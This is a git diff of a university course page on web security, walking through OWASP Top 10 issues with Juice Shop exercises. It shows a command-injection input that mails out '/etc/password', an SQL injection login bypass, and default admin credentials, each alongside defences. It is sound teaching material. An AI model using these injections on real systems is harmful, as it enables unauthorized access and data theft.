@@ -3,7 +3,7 @@ layout: default
 permalink: /security/
 linkname: Web security
 ordering: 8
-warning: true
+warning: false
 ---
 
 # Web security <!-- omit in toc -->
@@ -64,10 +64,9 @@ warning: true
   - :tv: [The Power of the Web Platform](https://github.com/feross/TheAnnoyingSite.com) - a talk by Feross Aboukhadijeh about what annoying things are possible on the web. Entertaining! Be sure to not open the accompanying website while in a quiet space.
 - Recommended readings:
   - Chapter 18 of the [Web Development with Node & Express book](https://www.oreilly.com/library/view/web-development-with/9781492053507/)
-  - [Stanford's 2019 Web Security course](https://web.stanford.edu/class/cs253/) covers many web security issues in detail.
+  - [Stanford's Web Security course](https://web.stanford.edu/class/cs253/) covers many web security issues in detail.
   - :closed_book: If you want to know everything there is about security, read Ross Anderson's [Security Engineering book](https://www.cl.cam.ac.uk/~rja14/book.html). [Chapter 21](http://www.cl.cam.ac.uk/%7Erja14/Papers/SEv2-c21.pdf) is most pertinent to the web security lecture (warning: this is an extensive read).
-  - [Stanford's Computer and Network Security course](https://cs155.github.io/Spring2019/) has a number of lectures on web security (PDFs: [here](https://cs155.github.io/Spring2019/lectures/08-web.pdf), [here](https://cs155.github.io/Spring2019/lectures/09-web-attacks.pdf) and [here](https://cs155.github.io/Spring2019/lectures/10-SessionMgmt.pdf)).
-  - The [Open Web Application Security Project](https://www.owasp.org/index.php/Main_Page) provides an extensive list of practical tips, best practices and further readings on the topic.
+  - [Stanford's Computer and Network Security course](https://cs155.stanford.edu/) has a number of lectures on web security.
   - [Node.js security best practices](https://medium.com/@nodepractices/were-under-attack-23-node-js-security-best-practices-e33c146cb87d).
   - MDN has a very good [collection of Web security articles](https://developer.mozilla.org/en-US/docs/Web/Security).
 - Relevant scientific publications:
@@ -148,7 +147,7 @@ A variant of a DoS attack is a _Distributed Denial of Service_ (DDoS) attack whe
 
 The most difficult component of a system to secure is its users. **Phishing** and **social engineering** can lead unsuspecting users to give access to some part of the secured system to attackers. Once in, attackers try to infiltrate other internal systems.
 
-A common example (also described in this [attack on the US State Department](https://edition.cnn.com/2015/04/07/politics/how-russians-hacked-the-wh/)) is the sending of emails to government employees impersonating a colleague and requesting access to a low-level security system. Who-knows-whom can often be inferred from public appearances, the staff overview on websites, public documents, and so on. Often, access is granted by the unsuspecting user, despite policies to the contrary. Recently, the [University of Maastricht paid out 30 bitcoin (about 200,000 Euros) in ransom](https://www.reuters.com/article/us-cybercrime-netherlands-university-idUSKBN1ZZ2HH) to regain access to their computer systems which had been infiltrated by attackers via phishing.
+A common example (also described in this [attack on the US State Department](https://edition.cnn.com/2015/04/07/politics/how-russians-hacked-the-wh/)) is the sending of emails to government employees impersonating a colleague and requesting access to a low-level security system. Who-knows-whom can often be inferred from public appearances, the staff overview on websites, public documents, and so on. Often, access is granted by the unsuspecting user, despite policies to the contrary. Recently, the [University of Maastricht paid out 30 bitcoin (about 200,000 Euros&mdash;at the time) in ransom](https://www.reuters.com/article/us-cybercrime-netherlands-university-idUSKBN1ZZ2HH) to regain access to their computer systems which had been infiltrated by attackers via phishing.
 
 Unauthorized access can also be achieved by probing web applications for functionalities that should not be accessible to the average user. An example is [Instagram's backend admin panel](https://www.hackread.com/instagram-hacked-researcher-gets-admin-panel-access/) which was accessible on the web while it should have only been accessible from the internal Instagram network.
 
@@ -166,7 +165,7 @@ The most important **software security issues** for web and mobile applications 
 
 <sup>Most important software security issues. Figure taken from page 56, CSRHPE.</sup>
 
-:point*up: In general, mobile applications are more vulnerable than web applications; the worst issues were found in the \_security features* category, which includes authentication, access control, confidentiality and cryptography issues. 99% of mobile applications had at least one issue here. The _environment_ category is also problematic with 77% of web applications and 88% of mobile applications having an issue here - this refers to server misconfigurations, improper file settings, sample files and outdated software versions. The third category to mention is _input validation and representation_ which covers issues such as cross-site scripting and SQL injections, that are present in most mobile applications and 44% of web applications. The latter is actually surprising, as a lot of best practices of how to secure web applications exist - clearly though, these recommendations are often ignored.
+:point_up: In general, mobile applications are more vulnerable than web applications; the worst issues were found in the *security features* category, which includes authentication, access control, confidentiality and cryptography issues. 99% of mobile applications had at least one issue here. The _environment_ category is also problematic with 77% of web applications and 88% of mobile applications having an issue here - this refers to server misconfigurations, improper file settings, sample files and outdated software versions. The third category to mention is _input validation and representation_ which covers issues such as cross-site scripting and SQL injections, that are present in most mobile applications and 44% of web applications. The latter is actually surprising, as a lot of best practices of how to secure web applications exist&mdash;clearly though, these recommendations are often ignored.
 
 If we zoom in on the non-mobile applications, the ten most commonly occurring vulnerabilities are the following, reported as the _percentage of applications_ and _median vulnerability count_:
 
@@ -174,17 +173,17 @@ If we zoom in on the non-mobile applications, the ten most commonly occurring vu
 
 <sup>Top 10 vulnerabilities. Figure taken from page 57, CSRHPE.</sup>
 
-:point*up: Some of these vulnerabilities you should already recognize and be able to place in context, specifically \_Cookie Security: cookie not sent over SSL* and _Cookie Security: HTTPOnly not set_. The vulnerability _Privacy violation: autocomplete_ should intuitively make sense: auto-completion is a feature provided by modern browsers; browsers store information submitted by the user through `<input>` fields. The browser can then offer autocompletion for subsequent forms with similar field names. If sensitive information is stored in this manner, a malicious actor can provide a form to a user that is then auto-filled with sensitive values and transmitted back to the attacker. For this reason, it is often worthwhile to [switch off autocompletion](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion) for sensitive input fields.
+:point_up: Some of these vulnerabilities you should already recognize and be able to place in context, specifically *Cookie Security: cookie not sent over SSL* and _Cookie Security: HTTPOnly not set_. The vulnerability _Privacy violation: autocomplete_ should intuitively make sense: auto-completion is a feature provided by modern browsers; browsers store information submitted by the user through `<input>` fields. The browser can then offer autocompletion for subsequent forms with similar field names. If sensitive information is stored in this manner, a malicious actor can provide a form to a user that is then auto-filled with sensitive values and transmitted back to the attacker. For this reason, it is often worthwhile to [switch off autocompletion](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion) for sensitive input fields.
 
-:point*up: Lastly, let's discuss the \_Hidden field* vulnerability. It provides developers with a simple manner of including data that should not be seen/modified by users when a `<form>` is submitted. For example, a web portal may offer the same form on every single web page and the hidden field stores a numerical identifier of the specific page (or route) the form was submitted from. However, as with any data sent to the browser, with a bit of knowledge about the dev tools available in modern browsers, the user can easily change the hidden field values, which creates a vulnerability if the server does not validate the correctness of the returned value.
+:point_up: Lastly, let's discuss the *Hidden field* vulnerability. It provides developers with a simple manner of including data that should not be seen/modified by users when a `<form>` is submitted. For example, a web portal may offer the same form on every single web page and the hidden field stores a numerical identifier of the specific page (or route) the form was submitted from. However, as with any data sent to the browser, with a bit of knowledge about the dev tools available in modern browsers, the user can easily change the hidden field values, which creates a vulnerability if the server does not validate the correctness of the returned value.
 
-Taking a slightly higher-level view, the top five violated security categories across all scanned applications are the following, reported as _percentage of applications violating a category_ :point_down::
+Taking a slightly higher-level view, the top five violated security categories across all scanned applications are the following, reported as _percentage of applications violating a category_:
 
 ![Top 5 violated security categories](../img/security-security-report-3.png)
 
 <sup>Top 5 violated security categories. Figure taken from page 59, CSRHPE.</sup>
 
-:point*up: The only category not covered so far is \_Insecure transport*. This refers to the fact that applications rely on insecure communication channels or weakly secured channels to transfer sensitive data. Nowadays, at least for login/password fields, the modern browsers provide a warning to the user indicating the non-secure nature of the connection, as seen in this example :point_down::
+:point_up: The only category not covered so far is *Insecure transport*. This refers to the fact that applications rely on insecure communication channels or weakly secured channels to transfer sensitive data. Nowadays, at least for login/password fields, the modern browsers provide a warning to the user indicating the non-secure nature of the connection, as seen in this example :point_down::
 
 ![Juice Shop not secure](../img/security-browser-warning-juiceshop.png)
 
@@ -193,16 +192,18 @@ Taking a slightly higher-level view, the top five violated security categories a
 It is worth noting that in recent years browsers have implemented support for the `Strict-Transport-Security` header, which allows web applications to inform the browser that it should **only** be accessed via HTTPS. This prevents attacks such as described in this [MDN article on `Strict-Transport-Security`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security):
 
 ```
-You log into a free WiFi access point at an airport and start surfing the web, visiting your
-online banking service to check your balance and pay a couple of bills. Unfortunately, the
-access point you're using is actually a hacker's laptop, and they're intercepting your original
-HTTP request and redirecting you to a clone of your bank's site instead of the real thing.
-Now your private data is exposed to the hacker.
+You log into a free WiFi access point at an airport and start surfing 
+the web, visiting your online banking service to check your balance 
+and pay a couple of bills. Unfortunately, the access point you're using 
+is actually a hacker's laptop, and they're intercepting your original
+HTTP request and redirecting you to a clone of your bank's site instead 
+of the real thing. Now your private data is exposed to the hacker.
 
-Strict Transport Security resolves this problem; as long as you've accessed your bank's website
-once using HTTPS, and the bank's website uses Strict Transport Security, your browser will know
-to automatically use only HTTPS, which prevents hackers from performing this
-sort of man-in-the-middle attack.
+Strict Transport Security resolves this problem; as long as you've 
+accessed your bank's website once using HTTPS, and the bank's website 
+uses Strict Transport Security, your browser will know to automatically 
+use only HTTPS, which prevents hackers from performing this sort of 
+man-in-the-middle attack.
 ```
 
 ## Juice Shop & OWASP
@@ -211,7 +212,7 @@ The best way to learn about web security is to try out the introduced techniques
 
 The [OWASP Juice Shop application](https://owasp.org/www-project-juice-shop/) was designed specifically for this purpose. It is an insecure web application written in JavaScript (using Node.js/Express/Angular) that contains a wide range of vulnerabilities.
 
-:bangbang: [Juice Shop's GitHub repository](https://github.com/bkimminich/juice-shop) comes with detailed installation instructions that allow you to install it locally on your machine or in the cloud. We strongly suggest you to do so, and to follow the practical guide we provide in the next sections. More specifically, we suggest to use the [Docker container setup](https://github.com/bkimminich/juice-shop#docker-container) - if you need help installing Docker or Juice Shop, please ask the student assistants during lab hours!
+:bangbang: [Juice Shop's GitHub repository](https://github.com/bkimminich/juice-shop) comes with detailed installation instructions that allow you to install it locally on your machine or in the cloud. We suggest you to do so, and to follow the practical guide we provide in the next sections. More specifically, we suggest to use the [Docker container setup](https://github.com/bkimminich/juice-shop#docker-container).
 
 Note that Juice Shop also comes with an [official companion guide](https://github.com/bkimminich/juice-shop#official-companion-guide) that contains an overview of all existing vulnerabilities. We cover only a small part of those.
 
@@ -231,13 +232,13 @@ Input for injection attacks can be created via:
 - hidden form field manipulation;
 - cookie manipulation.
 
-Injection attacks on the server can take multiple forms, we first consider **OS command injection** :point_down::
+Injection attacks on the server can take multiple forms, we first consider **OS command injection**:
 
 ![OS command injection](../img/security-os-command-injection.png)
 
 <sup>OS command injection.</sup>
 
-:point*up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (\_Thank you for signing up for our mailing list.*). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
+:point_up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (*Thank you for signing up for our mailing list.*). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
 
 - The benign input `john@test.nl` leads to the following OS command: `cat confirm|mail john@test.nl`. This command line is indeed sufficient to send an email, as Linux has a command line [mail](https://linux.die.net/man/1/mail) tool.
 - An example of malicious input is the following: `john@test.nl; cat /etc/password | mail john@test.nl`. If the input is not checked, the server-side command line will look as follows: `cat confirm | mail john@test.nl; cat /etc/password | mail john@test.nl`. Now, two emails are sent: the confirmation email and a mail sending the server's file `/etc/password` to `john@test.nl`. This is clearly _unintended code execution_.
@@ -266,7 +267,7 @@ let sqlQuery = "select * from users where name = '"+u+"' and password = '" + p +
 
 #### :bangbang: Juice Shop
 
-We here take up the **Login Bender** attack among all available [Juice Shop injection attacks](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/injection.html). The task is simple: try to login as the user `Bender` via an injection attack.
+We here take up the **Login Bender** attack among all available [Juice Shop injection attacks](https://pwning.owasp-juice.shop/part2/injection.html). The task is to try to login as the user `Bender` via an injection attack.
 
 1. To execute, head to your local Juice Shop installation. If you followed our suggestion of using the Docker setup, your local installation will be at [http://localhost:3000](http://localhost:3000).
 2. Head to the login screen via the Account link at the top right.
@@ -274,32 +275,11 @@ We here take up the **Login Bender** attack among all available [Juice Shop inje
 4. With a little bit of guessing, we will end up at `bender@juice-sh.op` as the email address of user `Bender`. See if you can log in with that email address and any password of your choosing. _This should not be possible. You should receive an error message._
 5. Now try the same email address with our little SQL injection suffix `'--`: `bender@juice-sh.op'--`. No matter the provided password, you should be able to log in as user `Bender`.
 
-Why does this work? Lets take a look at the source code of Juice Shop, in particular the [login route](https://github.com/bkimminich/juice-shop/blob/master/routes/login.js). It contains the following code snippet :point_down::
+Why does this work? Lets take a look at the source code of Juice Shop, in particular the [login route](https://github.com/juice-shop/juice-shop/blob/master/routes/login.ts)&mdash;it has recently been rewritten in TypeScript but still contains code that is recognizable to us. It contains the following code snippet :point_down::
 
 ```javascript
-module.exports = function login() {
-  /* ... */
+models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true })
 
-  return (req, res, next) => {
-    /* ... */
-    models.sequelize
-      .query(
-        `SELECT * FROM Users WHERE email = '${
-          req.body.email || ""
-        }' AND password = '${insecurity.hash(
-          req.body.password || ""
-        )}' AND deletedAt IS NULL`,
-        { model: models.User, plain: true }
-      )
-      .then((authenticatedUser) => {
-        /* ... */
-      })
-      .catch((error) => {
-        next(error);
-      });
-  };
-};
-/* ... */
 ```
 
 :point_up: As we anticipated, the user input is not validated but inserted directly into an SQL query.
@@ -311,8 +291,8 @@ Injection attacks can be avoided by **validating** user input (e.g., is this inp
 A popular Node package that validates and sanitizes user input is [validator](https://www.npmjs.com/package/validator). For example, to check whether a user input constitutes a valid email address, the following two lines of code are sufficient:
 
 ```javascript
-var validator = require("validator");
-var isEmail = validator.isEmail("while(1)"); //false
+const validator = require("validator");
+const isEmail = validator.isEmail("while(1)"); //false
 ```
 
 To avoid SQL injection attacks, [sqlstring](https://www.npmjs.com/package/sqlstring) is a Node.js package that escapes user provided input. Even better, instead of writing SQL queries on the fly (so-called dynamic queries as shown above), use **prepared statements** as [described here for PostgreSQL](https://www.postgresql.org/docs/current/sql-prepare.html).
@@ -337,11 +317,11 @@ An attacker can exploit broken authentication and session management functions t
 
 #### :bangbang: Juice Shop
 
-Juice Shop's [broken authentication challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/broken-authentication.html) involve a considerable number of web searches to find information about its _users_. They also showcase the issue of weak and default passwords. We here take up the challenge of logging in with the administrator's user credentials without applying an SQL injection. This boils down to guessing the admin's username and password. This is not a completely random exercise, as there default credentials available that are often left unchanged by administrators. Even if not the default, often usernames are guessable and passwords are weak. In the case of Juice Shop, the admin email address is `admin@juice-sh.op` and the login is `admin123`. The very popular GitHub repo [SecLists](https://github.com/danielmiessler/SecLists) contains among others collections of common usernames and common passwords to aid _penetration testers_ (i.e. testers evaluating the security of applications) in their work. If an application does not control the maximum number of input attempts in a certain time window (Juice Shop indeed does not), an automated script could be employed to run through all common username/password combinations until a valid username/password combination is found.
+Juice Shop's [broken authentication challenges](https://pwning.owasp-juice.shop/part2/broken-authentication.html) involve a considerable number of web searches to find information about its _users_. They also showcase the issue of weak and default passwords. We here take up the challenge of logging in with the administrator's user credentials without applying an SQL injection. This boils down to guessing the admin's username and password. This is not a completely random exercise, as there default credentials available that are often left unchanged by administrators. Even if not the default, often usernames are guessable and passwords are weak. In the case of Juice Shop, the admin email address is `admin@juice-sh.op` and the login is `admin123`. The very popular GitHub repo [SecLists](https://github.com/danielmiessler/SecLists) contains among others collections of common usernames and common passwords to aid _penetration testers_ (i.e. testers evaluating the security of applications) in their work. If an application does not control the maximum number of input attempts in a certain time window (Juice Shop indeed does not), an automated script could be employed to run through all common username/password combinations until a valid username/password combination is found.
 
 #### How to avoid it
 
-- Good authentication and session management is difficult - avoid, if possible, an implementation from scratch.
+- Good authentication and session management is difficult&mdash;avoid, if possible, an implementation from scratch.
 - Ensure that the session ID is never sent over the network **unencrypted**. We have already learnt in the previous lecture that the `Secure` flag can be set for a cookie to ensure that.
 - Session IDs should not be visible in URLs.
 - Generate a new session ID on login and **avoid reuse**.
@@ -382,7 +362,7 @@ http://myforum.nl/search?q=<script>…
 
 #### :bangbang: Juice Shop
 
-Among [Juice Shop's XSS challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/xss.html) we take a look at a reflected XSS attack.
+Among [Juice Shop's XSS challenges](https://pwning.owasp-juice.shop/part2/xss.html) we take a look at a reflected XSS attack.
 
 Head to your Juice Shop installation and look for the search bar. Try to search for different things (`juice`, `apple`, `pear`). You will see that the original query `XX` is always shown at the top of the search results as `Search Results - XX`. Let's see whether the search result input is sufficiently sanitized or whether it allows us to perform a reflected XSS attack.
 
@@ -418,7 +398,7 @@ Improper input validation is often the root cause of other vulnerabilities, e.g.
 
 #### :bangbang: Juice Shop
 
-Of the [input validation challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/improper-input-validation.html) we focus on the registration with mismatching passwords.
+Of the [input validation challenges](https://pwning.owasp-juice.shop/part2/improper-input-validation.html) we focus on the registration with mismatching passwords.
 
 Head over to your Juice Shop installation and register a new user (you find the link to the registration form on the login form). Fill in the registration form. You will observe that the `Repeat Password` field shows an error until the two passwords are a match. Now, go back to the `Password` field and change its content. You should now not be able to register due to the mismatch, but you can! The mismatched passwords do not raise an error during the user registration process.
 
@@ -438,13 +418,11 @@ Web application engineering requires extensive knowledge of system administratio
 
 #### :bangbang: Juice Shop
 
-Among the [security misconfiguration challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/security-misconfiguration.html) we take a look at error handling: the task here is to find a URL that provides us with information about the server (essentially a 5XX status message). While URLs (we assume a local installation of Juice Shop) such as `http://localhost:3000/fdsfs` are handled gracefully, the REST API endpoints have issues. The URL `http://localhost:3000/rest/` will return a status code 500 with important information bout the Express version that is being run on the server-side. This information in turn can be used by a malicious user to track down security vulnerabilities of this particular Express version. The proper way to deal with such server-side errors is to show a customized error message that does not reveal unnecessary information about the server.
+Among the [security misconfiguration challenges](https://pwning.owasp-juice.shop/part2/security-misconfiguration.html) we take a look at error handling: the task here is to find a URL that provides us with information about the server (essentially a 5XX status message). While URLs (we assume a local installation of Juice Shop) such as `http://localhost:3000/fdsfs` are handled gracefully, the REST API endpoints have issues. The URL `http://localhost:3000/rest/` will return a status code 500 with important information bout the Express version that is being run on the server-side. This information in turn can be used by a malicious user to track down security vulnerabilities of this particular Express version. The proper way to deal with such server-side errors is to show a customized error message that does not reveal unnecessary information about the server.
 
 #### How to avoid it
 
 Install the latest stable version of Node.js and Express. Install security updates. Rely on [`npm audit`](https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities) (and then `npm audit fix`) to assess and fix your dependencies' security issues.
-
-[RetireJS](https://github.com/RetireJS/retire.js) is another tool to detect outdated JavaScript libraries. It does not fix anything but lists vulnerabilities with greater detail than `npm audit`.
 
 A popular package to secure Express-based applications is [Helmet](https://www.npmjs.com/package/helmet). It acts as middleware in Express applications and sets HTTP headers according to best security practices.
 
@@ -460,7 +438,7 @@ In addition, if sensitive documents can be accessed without authorization a mali
 
 #### :bangbang: Juice Shop
 
-Of the [sensitive data exposure challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/sensitive-data-exposure.html) we here cover the _Confidential Document_ task which is simple: access a confidential document.
+Of the [sensitive data exposure challenges](https://pwning.owasp-juice.shop/part2/sensitive-data-exposure.html) we here cover the _Confidential Document_ task which is simple: access a confidential document.
 
 1. Head over to your Juice Shop installation, access the top-left side menu and click on the _About Us_ link.
 2. Take a closer link at the hyperlink `Check out our boring terms of use if you are interested in such lame stuff`. It is a relative link `ftp/legal.md`.
@@ -481,7 +459,7 @@ A malicious user, who is authorized to access a web application (e.g., a student
 Web applications often make use of _Direct Object References_ when generating a HTTP response. We have already seen this in a code snippet in the [second Node.js lecture](https://chauff.github.io/Web-Teaching/nodejs2/) :point_down::
 
 ```javascript
-var wishlistPriorities = {
+const wishlistPriorities = {
   high: ["Wingspan", "Settlers of Catan", "Azul"],
   medium: ["Munchkin"],
   low: ["Uno", "Scrabble"],
@@ -496,13 +474,13 @@ app.get("/wishlist/:priority", function (req, res, next) {
 });
 ```
 
-Here :point*up:, we use the routing parameter `:priority` as property name of the `wishlistPriorities` object. Applications that do not verify whether a user requesting a particular route is authorized to access the route face security issues. In our concrete code example, this leads to so-called \_insecure direct object references*. A malicious user can test a range of target URLs that should require authentication to determine whether this issue exists. This is especially easy for large web frameworks which come with a number of default routes enabled.
+Here :point_up:, we use the routing parameter `:priority` as property name of the `wishlistPriorities` object. Applications that do not verify whether a user requesting a particular route is authorized to access the route face security issues. In our concrete code example, this leads to so-called *insecure direct object references*. A malicious user can test a range of target URLs that should require authentication to determine whether this issue exists. This is especially easy for large web frameworks which come with a number of default routes enabled.
 
 Consider a user who accesses her wishlist using the following URL `http://mywishlist.nl/wishlist?id=234`. Nothing stops the user from also trying, e.g., `http://mywishlist.nl/wishlist?id=2425353` or `http://mywishlist.nl/wishlist?id==1`. If the id values are insecure direct object references, the user can view other users' wishlists in this manner.
 
 #### :bangbang: Juice Shop
 
-Of the [broken access control challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/broken-access-control.html) we cover the _View Basket_ challenge: view another user's shopping basket.
+Of the [broken access control challenges](https://pwning.owasp-juice.shop/part2/broken-access-control.html) we cover the _View Basket_ challenge: view another user's shopping basket.
 
 1. Go to your Juice Shop and login as `Bender`.
 2. Add a few items to your shopping basket and view the basket at `http://localhost:3000/#/basket` (assuming a local installation).
@@ -544,8 +522,6 @@ The main reason why this attack is successful in our example is due to the serve
 
 How can the server validate that this request was intentionally sent by the user? The most common approach today is via a so-called _CSRF token_, a randomly generated string, generated by the server, that is unpredictable and cannot be guessed. The server inserts this CSRF token in the response, typically in a hidden form field (**not** in a cookie). The server also keeps track of the combination of session ID and CSRF token. When the user then fills in the form and submits it to the server, the CSRF token is returned to the server and the server checks whether it matches the one it has on record. If it is a match, the server executes the requested action (e.g., changing a user's profile data) and rejects it otherwise. An attacker is not able to guess this CSRF token - as long as we do not rely on cookies to store CSRF tokens, as cookies are appended to the HTTP request automatically by the browser. Although the attacker can try to guess a valid CSRF token, it should be impossible if the server generates CSRF tokens according to best practices.
 
-As CSRF tokens are an established line of defense, Express middleware exists (a popular option is [csurf](https://www.npmjs.com/package/csurf)) that takes care of the generation and validation of CSRF tokens.
-
 Another option for a web application to verify that a user intended a particular request are the use of reauthentication (the user is asked to authenticate again, e.g., if the request takes place at an unusual time, or at an unusual location).
 
 Going back to our example, if a user is accessing a _Win an iPAD_ web site and after submitting her ticket receives a request to reauthenticate to her online banking provider, she should realize that something is off.
@@ -560,20 +536,20 @@ In 2018, a vulnerability called [Zip Slip](https://github.com/snyk/zip-slip-vuln
 
 #### :bangbang: Juice Shop
 
-Among the [vulnerable components challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/vulnerable-components.html) we cover the _Vulnerable Library_: inform the shop about a vulnerable library it is using.
+Among the [vulnerable components challenges](https://pwning.owasp-juice.shop/part2/vulnerable-components.html) we cover the _Vulnerable Library_: inform the shop about a vulnerable library it is using.
 
 There are many auditing tools available, a basic form of security auditing offers [`npm audit`](https://docs.npmjs.com/cli/audit), which scans all packages that depend on the application for known security issues. We first need to clone Juice Shop's GitHub repo, generate its `package-lock.json` file (which provides precise information on the required packages' dependencies) and finally run the security audit. Taken together the commands look as follows (starting with the creation of a temporary directory) :point_down::
 
 ```
 → mkdir tmpDir
 → cd tmpDir
-→ git clone https://github.com/bkimminich/juice-shop.git
+→ git clone https://github.com/juice-shop/juice-shop.git
 → cd juice-shop
 → npm i --package-lock-only
 → npm audit
 ```
 
-Within seconds we know that several critical vulnerabilities exist, in which packages they exist, and what type of vulnerability they enable. Often, the fix seems easy: use a more recent version of an npm package. However, in practice updating an npm package can lead to a host of additional coding work due to version compatibilities.
+We now know that several critical vulnerabilities exist, in which packages they exist, and what type of vulnerability they enable. Often, the fix seems easy: use a more recent version of an npm package. However, in practice updating an npm package can lead to a host of additional coding work due to version compatibilities.
 
 Besides `npm audit`, commercial services such as [Snyk](https://snyk.io/) and exist to aid developers in keeping their libraries and package up to date.
 
@@ -597,7 +573,7 @@ The user, when seeing this URL :point_up: in an email or forum, might just inspe
 
 #### :bangbang: Juice Shop
 
-Of the [unvalidated redirects challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/unvalidated-redirects.html) we cover the _Outdated Whitelist_ challenge: attempt to redirect to a crypto currency address which is no longer included in the shop.
+Of the [unvalidated redirects challenges](https://pwning.owasp-juice.shop/part2/unvalidated-redirects.html) we cover the _Outdated Allowlist_ challenge: attempt to redirect to a crypto currency address which is no longer included in the shop.
 
 1. Head over to your Juice Shop installation and log in as any user.
 2. Check out the payment options at `http://localhost:3000/#/payment/shop` (assuming a local installation). You can also land here by following the procedure for _checking out_.
